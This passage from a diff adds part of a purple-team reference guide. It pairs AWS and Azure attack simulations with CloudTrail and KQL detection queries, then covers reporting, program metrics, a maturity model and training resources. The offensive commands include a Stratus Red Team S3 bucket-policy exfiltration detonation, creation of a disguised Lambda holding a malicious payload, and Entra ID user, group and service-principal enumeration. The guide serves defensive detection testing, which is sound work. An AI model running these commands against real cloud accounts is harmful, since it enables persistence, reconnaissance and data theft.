+stratus-red-team detonate aws.exfiltration.s3-backdoor-bucket-policy
+```
+
+**Detection — CloudTrail S3 data events (must be enabled):**
+```json
+{
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "GetObject",
+  "requestParameters": {
+    "bucketName": "corp-sensitive-bucket",
+    "key": "passwords.xlsx"
+  }
+}
+```
+
+#### Lambda Abuse (T1648)
+
+**Attack — create malicious Lambda for persistence or compute:**
+```bash
+aws lambda create-function   --function-name "LegitBackupFunction"   --runtime python3.9   --handler lambda_function.lambda_handler   --role arn:aws:iam::123456789:role/lambda-role   --zip-file fileb://malicious_payload.zip
+```
+
+**Detection:** CloudTrail `CreateFunction`, `UpdateFunctionCode` events from unusual principals or at unusual times.
+
+### 9.2 Stratus Red Team — Cloud Detonation Workflow
+
+**Standard workflow for any Stratus technique:**
+```bash
+# Step 1: List available techniques for your platform
+stratus-red-team list --platform aws
+
+# Step 2: Show technique details
+stratus-red-team show aws.exfiltration.s3-backdoor-bucket-policy
+
+# Step 3: Warm up (create prerequisites only, no attack yet)
+stratus-red-team warmup aws.exfiltration.s3-backdoor-bucket-policy
+
+# Step 4: Document current state (take CloudTrail baseline)
+aws cloudtrail lookup-events --start-time $(date -u -d '2 minutes ago' +%Y-%m-%dT%H:%M:%SZ)
+
+# Step 5: Detonate (execute the attack)
+stratus-red-team detonate aws.exfiltration.s3-backdoor-bucket-policy
+
+# Step 6: Wait for CloudTrail ingestion (up to 15 minutes)
+sleep 300
+
+# Step 7: Validate detection in SIEM
+# Query Splunk/Sentinel for expected alert
+
+# Step 8: Cleanup
+stratus-red-team cleanup aws.exfiltration.s3-backdoor-bucket-policy
+```
+
+**ATT&CK Cloud matrix:** The ATT&CK framework includes a dedicated Cloud matrix covering IaaS, SaaS, Office 365, Azure AD, and Google Workspace. Navigate to https://attack.mitre.org/matrices/enterprise/cloud/ for the full matrix.
+
+### 9.3 Azure Purple Teaming
+
+#### Entra ID (Azure AD) Enumeration (T1087.004)
+
+**Attack:**
+```powershell
+# Enumerate all users
+Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, Id
+
+# Enumerate all groups
+Get-MgGroup -All | Select-Object DisplayName, Id, GroupTypes
+
+# Enumerate all service principals (application identities)
+Get-MgServicePrincipal -All | Select-Object DisplayName, AppId, ServicePrincipalType
+```
+
+**Detection — Entra ID Audit Logs:**
+```kql
+AuditLogs
+| where OperationName in ("List users", "List groups", "List service principals")
+| where InitiatedBy.user.userPrincipalName !in (known_admin_upns)
+| project TimeGenerated, OperationName, InitiatedBy, ResultDescription
+```
+
+#### App Consent Phishing (T1566 + T1528)
+
+**Attack:** Trick user into granting OAuth permissions to malicious application.
+
+**Detection — Permission grant audit log:**
+```kql
+AuditLogs
+| where OperationName == "Consent to application"
+| extend ConsentedPermissions = tostring(TargetResources[0].modifiedProperties)
+| where ConsentedPermissions contains "Mail.Read" or ConsentedPermissions contains "Files.ReadWrite.All"
+| project TimeGenerated, InitiatedBy, ConsentedPermissions
+```
+
+#### ARM Resource Enumeration (T1580)
+
+**Detection — Azure Activity Log:**
+```kql
+AzureActivity
+| where OperationName contains "list" or OperationName contains "read"
+| where ActivityStatusValue == "Succeeded"
+| summarize count() by Caller, OperationName
+| where count_ > 100
+| sort by count_ desc
+```
+
+### 9.4 Cloud Detection Validation Workflow
+
+```
+1. Select cloud technique (e.g., aws.credential-access.ec2-steal-instance-credentials)
+2. Confirm CloudTrail / Entra audit logs are enabled and flowing to SIEM
+3. Execute technique via Stratus Red Team or manual API calls
+4. Wait for log ingestion SLA (AWS CloudTrail: up to 15 min; Entra: up to 30 min)
+5. Query SIEM for expected alert
+6. Document: Detected / Not Detected / Partial
+7. If not detected → identify gap:
+   - CloudTrail data events enabled? (S3, Lambda require explicit enablement)
+   - Log source connected to SIEM?
+   - Detection rule exists in SIEM?
+8. Remediate → Retest → Update coverage layer
+```
+
+### 9.5 Cloud Detection Challenges
+
+| Challenge | Description | Mitigation |
+|---|---|---|
+| **API calls vs. endpoint telemetry** | Cloud attacks appear as API calls in audit logs, not as process/file events. Detection logic is fundamentally different. | Build cloud-specific detection rules; don't rely on endpoint EDR for cloud technique detection |
+| **IAM permission complexity** | Hundreds of IAM permissions make it hard to know which are sensitive and what "normal" looks like | Baseline IAM API call patterns; alert on unusual combinations |
+| **Cross-account visibility** | Attacks traversing AWS Organizations accounts may generate events in different account CloudTrails | Centralize CloudTrail to organization-level S3 bucket + SIEM |
+| **Serverless gaps** | Lambda, Azure Functions may generate minimal telemetry beyond basic CloudTrail/Activity Log events | Enable Lambda advanced logging; monitor CloudWatch Logs |
+| **Log ingestion latency** | CloudTrail can have 5–15 minute delay; affects purple team SLA measurement | Account for latency in detection SLA expectations; don't fail tests at 5 minutes |
+
+---
+## 10. Purple Team Reporting & Maturity
+
+### 10.1 Report Structure
+
+**Executive Summary (1–2 pages):**
+- Coverage % before and after the exercise
+- Number of techniques tested
+- Number of new detections created during exercise
+- Key findings summary (top 3 detection gaps and their risk)
+- Risk reduction narrative
+
+**Methodology section:**
+- Threat actor(s) emulated and justification
+- Scope (asset classes, timeframe, tools used)
+- ATT&CK matrix version used
+- Scoring methodology (0–100 scale description)
+
+**Findings by ATT&CK tactic (one section per tactic tested):**
+
+| Field | Content |
+|---|---|
+| Technique | T1558.003 — Kerberoasting |
+| Result | NOT DETECTED |
+| Alert quality | N/A — no alert |
+| Detection gap | Log source present (Event 4769), no detection rule |
+| Remediation | Create Sigma rule for RC4 TGS requests; deploy to SIEM |
+| Priority | High — used by APT28, APT29, Sandworm |
+| Owner | Detection Engineering |
+| Due date | 30 days |
+
+**ATT&CK Navigator before/after heatmap:**
+- Export "before" layer (pre-exercise scores)
+- Export "after" layer (post-exercise scores with new detections)
+- Include both in report appendix as SVG images
+- Calculate and report the net coverage improvement
+
+**Remediation roadmap:**
+- Prioritized by: Risk severity × Ease of implementation
+- Include: Responsible team, estimated effort, due date, validation method
+
+### 10.2 Program Metrics
+
+Track these metrics across every purple team exercise to demonstrate program value:
+
+**Coverage metrics:**
+```
+ATT&CK Technique Coverage % =
+  (Techniques with detection score ≥ 75) / (Total techniques tested) × 100
+
+Target: Improve by ≥ 10 percentage points per quarter
+```
+
+**Detection quality score per technique:**
+- Average score across all tested techniques (0–100 scale)
+- Track trend quarter-over-quarter
+
+**Mean Time to Detect (MTTD):**
+```
+MTTD = Average time from atomic test execution to SIEM alert generation
+Measure per technique and per log source
+Target: < 5 minutes for EDR-sourced detections
+         < 15 minutes for SIEM rule-based detections
+```
+
+**False negative rate by log source:**
+```
+False Negative Rate (log source X) =
+  (Techniques sourced from X that were NOT detected) /
+  (Total techniques where X is the expected log source) × 100
+```
+
+**Remediation rate from prior exercises:**
+```
+Remediation Rate =
+  (Open findings from prior exercise now remediated) /
+  (Total findings from prior exercise) × 100
+
+Target: > 80% remediation rate within 90 days
+```
+
+**Coverage improvement quarter-over-quarter:**
+```
+QoQ Coverage Improvement = Coverage Q(n) % - Coverage Q(n-1) %
+Target: Positive trend; ≥ 5 percentage points per quarter
+```
+
+### 10.3 Purple Team Maturity Model
+
+| Level | Name | Characteristics |
+|---|---|---|
+| **L1** | Ad-hoc | Occasional atomic tests run manually; results not tracked systematically; no ATT&CK mapping; no before/after comparison |
+| **L2** | Structured | Regular campaigns with defined scope; results tracked in Vectr or equivalent; ATT&CK Navigator heatmaps; basic metrics (coverage %) |
+| **L3** | Threat-Informed | CTI integration — campaigns driven by real threat actor TTPs; detection gap analysis tied to specific actors; remediation tracked to completion |
+| **L4** | Automated | Continuous automated atomic execution (CI/CD pipeline); SIEM queried programmatically; coverage dashboard updated automatically; regression alerts |
+| **L5** | Proactive | Threat modeling before actors adopt techniques (using CTI and ATT&CK research); integration with threat hunting; purple team findings drive SIEM architecture; executive KPI dashboard |
+
+**Maturity self-assessment questions:**
+- L1→L2: Are all test results tracked and mapped to ATT&CK technique IDs?
+- L2→L3: Is the test plan driven by identified threat actors targeting your industry?
+- L3→L4: Are tests running automatically on a schedule with programmatic detection validation?
+- L4→L5: Are you testing techniques before they appear in active threat actor TTPs?
+
+### 10.4 Continuous Program Building
+
+**Monthly — Automated atomic validation:**
+```
+Schedule: 1st Monday of each month, 02:00 UTC
+Scope: Full Atomic Red Team library for in-scope platforms
+Method: CI/CD pipeline (see Section 7.6)
+Output: Coverage dashboard update; regression alerts to Slack
+```
+
+**Quarterly — Structured campaign:**
+```
+Schedule: First 2 weeks of each quarter
+Scope: Threat actor emulation plan (rotated quarterly)
+Method: Manual purple team with red operator + detection engineer
+Output: Vectr campaign results; Navigator before/after; executive report
+Remediation: Findings enter Jira with 60-day SLA
+```
+
+**Annual — Full red team:**
+```
+Scope: Full kill chain, production environment, blind blue team
+Output: Strategic report; informs next year's purple team priority list
+Integration: Red team findings seed next year's purple team test backlog
+```
+
+**Integration with detection backlog:**
+```
+Purple Team finding (not detected)
+  → Jira ticket created automatically via Vectr API integration
+  → Assigned to Detection Engineering squad
+  → SLA: Critical = 7 days, High = 30 days, Medium = 60 days
+  → Verification: Re-run atomic test after fix, update Vectr outcome
+  → SLA compliance reported to CISO monthly
+```
+
+### 10.5 Training Resources
+
+**Formal courses:**
+| Course | Provider | Level | Focus |
+|---|---|---|---|
+| SEC599: Defeating Advanced Adversaries | SANS Institute | Advanced | Purple team end-to-end |
+| ATT&CK for Cyber Threat Intelligence | MITRE (free) | Intermediate | CTI + ATT&CK mapping |
+| Purple Team Fundamentals | AttackIQ Academy (free) | Beginner | Purple team foundations |
+| Certified Purple Team Analyst (CPTA) | Cyberwarfare Labs | Intermediate | Hands-on purple team |
+
+**Hands-on labs and ranges:**
+| Platform | URL | Focus |
+|---|---|---|
+| Blue Team Labs Online | blueteamlabs.online | Blue team / detection |
+| PentesterLab | pentesterlab.com | Offensive techniques (context for purple team) |
+| Range Force | rangeforce.com | Detection and IR exercises |
+| MITRE ATT&CK Training | attack.mitre.org/resources/training | ATT&CK methodology |
+| AttackIQ Academy | academy.attackiq.com | Free purple team + ATT&CK |
+
+**Reference repositories:**
+| Resource | URL | Use |
+|---|---|---|
+| Atomic Red Team | github.com/redcanaryco/atomic-red-team | Test execution |
+| CALDERA | github.com/mitre/caldera | Automated emulation |
+| Sigma Rules | github.com/SigmaHQ/sigma | Detection rule templates |
+| MITRE ATT&CK Navigator | github.com/mitre-attack/attack-navigator | Coverage visualization |
+| Adversary Emulation Library | github.com/center-for-threat-informed-defense/adversary_emulation_library | Emulation plans |
+| BloodHound | github.com/BloodHoundAD/BloodHound | AD attack path mapping |
+| Stratus Red Team | github.com/DataDog/stratus-red-team | Cloud emulation |
+| VECTR | github.com/SecurityRiskAdvisors/VECTR | Purple team tracking |
+
+---
+
+*End of PURPLE_TEAM_REFERENCE.md — TeamStarWolf Security Engineering*
